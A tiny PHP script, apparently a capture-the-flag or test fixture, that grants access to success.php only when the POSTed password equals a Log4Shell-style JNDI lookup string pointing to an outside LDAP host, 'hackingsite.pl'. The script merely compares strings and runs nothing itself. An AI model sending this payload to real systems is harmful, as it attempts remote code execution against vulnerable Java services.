<?php
 switch ($_SERVER['REQUEST_METHOD'])
 {
    case "POST":
        if ($_POST["passwd"] == "\${jndi:ldap://hackingsite.pl/myscript}"){
            readfile("success.php");
        } else {
            header("HTTP/1.0 401 Unauthorized");   
        }
        break;
    case "GET":
        header("HTTP/1.0 405 Method not allowed");
        break;
     }

     ?>